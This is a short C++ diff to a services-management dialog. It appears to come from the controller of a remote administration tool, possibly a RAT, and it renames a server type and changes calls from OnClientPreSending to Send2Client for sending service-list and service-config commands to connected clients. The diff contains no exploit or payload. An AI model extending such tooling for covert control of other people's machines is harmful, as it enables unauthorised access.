@@ -20,7 +20,7 @@ typedef  struct  ItemData1
 	}
 } ItemData1;
 
-CServicesDlg::CServicesDlg(CWnd* pParent, IOCPServer* IOCPServer, CONTEXT_OBJECT *ContextObject)
+CServicesDlg::CServicesDlg(CWnd* pParent, Server* IOCPServer, CONTEXT_OBJECT *ContextObject)
 	: DialogBase(CServicesDlg::IDD, pParent, IOCPServer, ContextObject, IDI_SERVICE)
 {
 }
@@ -157,7 +157,7 @@ void CServicesDlg::OnServicesStart()
 void CServicesDlg::OnServicesReflash()
 {
 	BYTE bToken = COMMAND_SERVICELIST;   //刷新
-	m_iocpServer->OnClientPreSending(m_ContextObject, &bToken, 1);	
+	m_iocpServer->Send2Client(m_ContextObject, &bToken, 1);	
 }
 
 // 释放资源以后再清空
@@ -254,7 +254,7 @@ void CServicesDlg::ServicesConfig(BYTE bCmd)
 
 	memcpy(szBuffer + dwOffset, szServiceName, lstrlen(szServiceName)+1);
 
-	m_iocpServer->OnClientPreSending(m_ContextObject, szBuffer, LocalSize(szBuffer));
+	m_iocpServer->Send2Client(m_ContextObject, szBuffer, LocalSize(szBuffer));
 	LocalFree(szBuffer);
 }
 
